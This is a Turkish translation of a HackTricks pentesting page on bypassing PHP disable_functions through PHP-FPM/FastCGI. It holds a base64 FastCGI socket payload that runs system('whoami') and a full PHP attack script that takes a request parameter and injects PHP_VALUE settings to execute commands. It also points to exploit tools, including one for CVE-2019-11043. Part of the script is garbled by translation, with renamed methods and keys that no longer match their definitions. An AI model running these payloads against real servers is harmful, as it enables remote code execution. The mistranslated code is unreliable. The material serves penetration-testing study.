# disable\_functions geçişi - php-fpm/FastCGI

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking hilelerinizi paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## PHP-FPM

**PHP-FPM**, özellikle **yüksek trafiğe sahip web siteleri için faydalı olan özellikler sunan standart PHP FastCGI'ye üstün bir alternatif olarak sunulmaktadır.** Bir PHP betiği isteği için, web sunucusu **PHP-FPM hizmetine bir FastCGI proxy bağlantısı başlatır**. Bu hizmet, **sunucudaki ağ bağlantı noktaları veya Unix soketleri aracılığıyla istekleri alabilme yeteneğine sahiptir.**

Proxy bağlantısının aracı rolüne rağmen, PHP-FPM'nin web sunucusuyla aynı makinede çalışır durumda olması gerekir. Kullanılan bağlantı, proxy tabanlı olsa da, geleneksel proxy bağlantılarından farklıdır. Bir istek aldığında, PHP-FPM'den uygun bir işçi işlemi isteği işler - PHP betiğini yürütür ve ardından sonuçları web sunucusuna geri ileterek. Bir işçi bir isteği işlemeyi tamamladıktan sonra, gelecek istekler için tekrar kullanılabilir hale gelir.

## Peki CGI ve FastCGI nedir?

### CGI

Normalde web sayfaları, dosyalar ve tarayıcıya aktarılan tüm belgeler, ev/kullanıcı/public\_html gibi belirli bir genel dizinde saklanır. **Tarayıcı belirli içeriği istediğinde, sunucu bu dizini kontrol eder ve gereken dosyayı tarayıcıya gönderir.**

Sunucuda **CGI** yüklüyse, özel cgi-bin dizini de eklenir, örneğin ev/kullanıcı/public\_html/cgi-bin. CGI betikleri bu dizinde saklanır. **Dizindeki her dosya yürütülebilir bir program olarak işlenir.** Dizinden bir betiğe erişildiğinde, sunucu dosyanın içeriğini tarayıcıya göndermek yerine bu betikten sorumlu uygulamaya istek gönderir. **Giriş verileri işlendikten sonra, uygulama çıktı verilerini** web sunucusuna gönderir ve sunucu da verileri HTTP istemcisine iletilir.

Örneğin, [http://mysitename.com/**cgi-bin/file.pl**](http://mysitename.com/\*\*cgi-bin/file.pl\*\*) adresindeki CGI betiği çalıştırıldığında, sunucu CGI aracılığıyla uygun Perl uygulamasını çalıştıracaktır. Betik yürütmesinden oluşturulan veriler, uygulama tarafından web sunucusuna gönderilecektir. Sunucu ise verileri tarayıcıya iletecektir. Sunucuda CGI olmasaydı, tarayıcı **.pl** dosyasının kodunu gösterirdi. (açıklama [buradan](https://help.superhosting.bg/en/cgi-common-gateway-interface-fastcgi.html))

### FastCGI

[FastCGI](https://en.wikipedia.org/wiki/FastCGI), ana işlevi aynı kalan geliştirilmiş bir [CGI](http://en.wikipedia.org/wiki/Common\_Gateway\_Interface) sürümü olan daha yeni bir web teknolojisidir.

FastCGI'yi geliştirmenin nedeni, Web'in uygulamaların hızlı gelişimi ve karmaşıklığı tarafından ortaya çıkması, ayrıca CGI teknolojisinin ölçeklenebilirlik eksikliklerini ele almak içindir. Bu gereksinimleri karşılamak için [Open Market](http://en.wikipedia.org/wiki/Open\_Market) **FastCGI'yi tanıttı - gelişmiş yeteneklere sahip CGI teknolojisinin yüksek performanslı bir versiyonu.**

## disable\_functions geçişi

`disable_functions` kısıtlamalarını aşmak için PHP kodunu FastCGI'yi suiistimal ederek ve çalıştırarak geçmek mümkündür.

### Gopherus Aracılığıyla

{% hint style="danger" %}
Bu modern sürümlerde çalışıp çalışmadığından emin değilim çünkü bir kez denedim ve hiçbir şey yürütülmedi. Lütfen, bu konuda daha fazla bilgiye sahipseniz benimle \[**PEASS & HackTricks telegram grubu burada**]\([**https://t.me/peass**](https://t.me/peass)), veya twitter \[**@carlospolopm**]\([**https://twitter.com/hacktricks\_live**](https://twitter.com/hacktricks\_live))** ile iletişime geçin.**
{% endhint %}

[Gopherus](https://github.com/tarunkant/Gopherus) kullanarak FastCGI dinleyicisine göndermek üzere bir yük oluşturabilir ve keyfi komutlar yürütebilirsiniz:

![](<../../../../.gitbook/assets/image (224).png>)
Sonra, urlencoded yükü alabilir ve decode edebilir ve base64'e dönüştürebilirsin, \[**örneğin bu CyberChef tarifi kullanarak**]\([http://icyberchef.com/#recipe=URL\_Decode%28%29To\_Base64%28'A-Za-z0-9%2B/%3D'%29\&input=JTAxJTAxJTAwJTAxJTAwJTA4JTAwJTAwJTAwJTAxJTAwJTAwJTAwJTAwJTAwJTAwJTAxJTA0JTAwJTAxJTAxJTA0JTA0JTAwJTBGJTEwU0VSVkVSX1NPRlRXQVJFZ28lMjAvJTIwZmNnaWNsaWVudCUyMCUwQiUwOVJFTU9URV9BRERSMTI3LjAuMC4xJTBGJTA4U0VSVkVSX1BST1RPQ09MSFRUUC8xLjElMEUlMDJDT05URU5UX0xFTkdUSDc2JTBFJTA0UkVRVUVTVF9NRVRIT0RQT1NUJTA5S1BIUF9WQUxVRWFsbG93X3VybF9pbmNsdWRlJTIwJTNEJTIwT24lMEFkaXNhYmxlX2Z1bmN0aW9ucyUyMCUzRCUyMCUwQWF1dG9fcHJlcGVuZF9maWxlJTIwJTNEJTIwcGhwJTNBLy9pbnB1dCUwRiUxN1NDUklQVF9GSUxFTkFNRS92YXIvd3d3L2h0bWwvaW5kZXgucGhwJTBEJTAxRE9DVU1FTlRfUk9PVC8lMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlMDAlMDAlMDAlMDElMDUlMDAlMDElMDBMJTA0JTAwJTNDJTNGcGhwJTIwc3lzdGVtJTI4JTI3d2hvYW1pJTIwJTNFJTIwL3RtcC93aG9hbWkudHh0JTI3JTI5JTNCZGllJTI4JTI3LS0tLS1NYWRlLWJ5LVNweUQzci0tLS0tJTBBJTI3JTI5JTNCJTNGJTNFJTAwJTAwJTAwJTAw](http://icyberchef.com/#recipe=URL\_Decode%28%29To\_Base64%28'A-Za-z0-9%2B/%3D'%29\&input=JTAxJTAxJTAwJTAxJTAwJTA4JTAwJTAwJTAwJTAxJTAwJTAwJTAwJTAwJTAwJTAwJTAxJTA0JTAwJTAxJTAxJTA0JTA0JTAwJTBGJTEwU0VSVkVSX1NPRlRXQVJFZ28lMjAvJTIwZmNnaWNsaWVudCUyMCUwQiUwOVJFTU9URV9BRERSMTI3LjAuMC4xJTBGJTA4U0VSVkVSX1BST1RPQ09MSFRUUC8xLjElMEUlMDJDT05URU5UX0xFTkdUSDc2JTBFJTA0UkVRVUVTVF9NRVRIT0RQT1NUJTA5S1BIUF9WQUxVRWFsbG93X3VybF9pbmNsdWRlJTIwJTNEJTIwT24lMEFkaXNhYmxlX2Z1bmN0aW9ucyUyMCUzRCUyMCUwQWF1dG9fcHJlcGVuZF9maWxlJTIwJTNEJTIwcGhwJTNBLy9pbnB1dCUwRiUxN1NDUklQVF9GSUxFTkFNRS92YXIvd3d3L2h0bWwvaW5kZXgucGhwJTBEJTAxRE9DVU1FTlRfUk9PVC8lMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlMDAlMDAlMDAlMDElMDUlMDAlMDElMDBMJTA0JTAwJTNDJTNGcGhwJTIwc3lzdGVtJTI4JTI3d2hvYW1pJTIwJTNFJTIwL3RtcC93aG9hbWkudHh0JTI3JTI5JTNCZGllJTI4JTI3LS0tLS1NYWRlLWJ5LVNweUQzci0tLS0tJTBBJTI3JTI5JTNCJTNGJTNFJTAwJTAwJTAwJTAw)). Ve ardından base64'ü bu php koduna kopyalayıp yapıştırabilirsin:
```php
<?php
$fp = fsockopen("unix:///var/run/php/php7.0-fpm.sock", -1, $errno, $errstr, 30); fwrite($fp,base64_decode("AQEAAQAIAAAAAQAAAAAAAAEEAAEBBAQADxBTRVJWRVJfU09GVFdBUkVnbyAvIGZjZ2ljbGllbnQgCwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOAkNPTlRFTlRfTEVOR1RINzYOBFJFUVVFU1RfTUVUSE9EUE9TVAlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUgPSBPbgpkaXNhYmxlX2Z1bmN0aW9ucyA9IAphdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DxdTQ1JJUFRfRklMRU5BTUUvdmFyL3d3dy9odG1sL2luZGV4LnBocA0BRE9DVU1FTlRfUk9PVC8AAAAAAQQAAQAAAAABBQABAEwEADw/cGhwIHN5c3RlbSgnd2hvYW1pID4gL3RtcC93aG9hbWkudHh0Jyk7ZGllKCctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0KJyk7Pz4AAAAA"));
```
### PHP açığı

{% hint style="danger" %}
Bu modern sürümlerde çalışıp çalışmadığından emin değilim çünkü bir kez denedim ve hiçbir şeyi yürütemedim. Aslında `phpinfo()`'yu FastCGI yürütmesinden gördüm ve `disable_functions`'ın boş olduğunu belirtti, ancak PHP (bir şekilde) hala daha önce devre dışı bırakılan herhangi bir işlevi yürütmeme engel oluyordu. Lütfen, bu konu hakkında daha fazla bilgiye sahipseniz benimle \[**PEASS & HackTricks telegram grubu burada**]\([**https://t.me/peass**](https://t.me/peass)), veya twitter \[**@carlospolopm**]\([**https://twitter.com/hacktricks\_live**](https://twitter.com/hacktricks\_live))** üzerinden iletişime geçin.**
{% endhint %}

Kod [buradan](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy) alınmıştır.
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return Dize
*/
public function istek(array $params, $stdin)
{
$response = '';
$this->bağlan();
$istek = $this->paketOluştur(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsIstek = '';
foreach ($params as $anahtar => $değer) {
$paramsIstek .= $this->nvÇiftiOluştur($anahtar, $değer);
}
if ($paramsIstek) {
$istek .= $this->paketOluştur(self::PARAMS, $paramsIstek);
}
$istek .= $this->paketOluştur(self::PARAMS, '');
if ($stdin) {
$istek .= $this->paketOluştur(self::STDIN, $stdin);
}
$istek .= $this->paketOluştur(self::STDIN, '');
fwrite($this->_sock, $istek);
do {
$cevap = $this->paketOku();
if ($cevap['tip'] == self::STDOUT || $cevap['tip'] == self::STDERR) {
$response .= $cevap['içerik'];
}
} while ($cevap && $cevap['tip'] != self::END_REQUEST);
var_dump($cevap);
if (!is_array($cevap)) {
throw new Exception('Kötü istek');
}
switch (ord($cevap['içerik']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('Bu uygulama çoklu bağlantıyı desteklemiyor [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('Yeni istek reddedildi; çok meşgul [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Rol değeri bilinmiyor [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// gerçek saldırı buradan başlıyor
if (!isset($_REQUEST['cmd'])) {
die("Girişinizi kontrol edin\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php system(\$_REQUEST['command']); phpinfo(); ?>"; // php yükü -- Hiçbir şey yapmaz
$php_value = "disable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "disable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Çağrı: $uri\n\n";
echo $client->istek($params, $code)."\n";
?>
```
Kullanılan önceki fonksiyon ile **`system`** fonksiyonunun **hala devre dışı** olduğunu ancak **`phpinfo()`** fonksiyonunun **`disable_functions`**'ın **boş** olduğunu göreceksiniz:

![](<../../../../.gitbook/assets/image (185).png>)

![](<../../../../.gitbook/assets/image (710).png>)

**Bu nedenle, `disable_functions`'ın yalnızca php `.ini` yapılandırma dosyaları aracılığıyla ayarlanabileceğini ve PHP\_VALUE'nun bu ayarı geçersiz kılmayacağını düşünüyorum.**

### [**FuckFastGCI**](https://github.com/w181496/FuckFastcgi)

Bu, `open_basedir` ve `disable_functions`'ı atlamak için fastcgi protokolünü sömürmek için bir php betiğidir.\
Kötü niyetli uzantıyı yükleyerek sıkı `disable_functions`'ı atlamak için size yardımcı olacaktır.\
Buna buradan erişebilirsiniz: [https://github.com/w181496/FuckFastcgi](https://github.com/w181496/FuckFastcgi) veya biraz değiştirilmiş ve geliştirilmiş sürümü burada: [https://github.com/BorelEnzo/FuckFastcgi](https://github.com/BorelEnzo/FuckFastcgi)

Sömürünün önceki kodla çok benzer olduğunu göreceksiniz, ancak `disable_functions`'ı atlamaya çalışmak yerine, kodu yürütmek için harici bir PHP modülü yüklemeye çalışır. Bu, değişken `PHP_ADMIN_VALUE` içindeki `extension_dir` ve `extension` parametrelerini kullanarak yapılır.\
**NOT1**: Muhtemelen sunucunun kullandığı **aynı PHP sürümüyle uzantıyı yeniden derlemeniz gerekecektir** (bunu phpinfo çıktısının içinde kontrol edebilirsiniz):

![](<../../../../.gitbook/assets/image (177).png>)

{% hint style="danger" %}
**NOT2**: Bu işi yapmayı başardım, `extension_dir` ve `extension` değerlerini bir PHP `.ini` yapılandırma dosyasına ekleyerek (bir sunucuya saldırarak yapamayacağınız bir şey) çalıştırmayı başardım. Ancak bu saldırıyı kullanırken ve uzantıyı `PHP_ADMIN_VALUE` değişkeninden yüklerken işlem sadece durdu, bu nedenle bu tekniğin hala geçerli olup olmadığını bilmiyorum.
{% endhint %}

### PHP-FPM Uzaktan Kod Yürütme Güvenlik Açığı (CVE-2019–11043)

Bu zafiyeti [**phuip-fpizdam**](https://github.com/neex/phuip-fpizdam) ile sömürebilir ve bunu test etmek için bu docker ortamını kullanabilirsiniz: [https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043).\
Ayrıca zafiyetin analizini [**burada**](https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc)** bulabilirsiniz.**
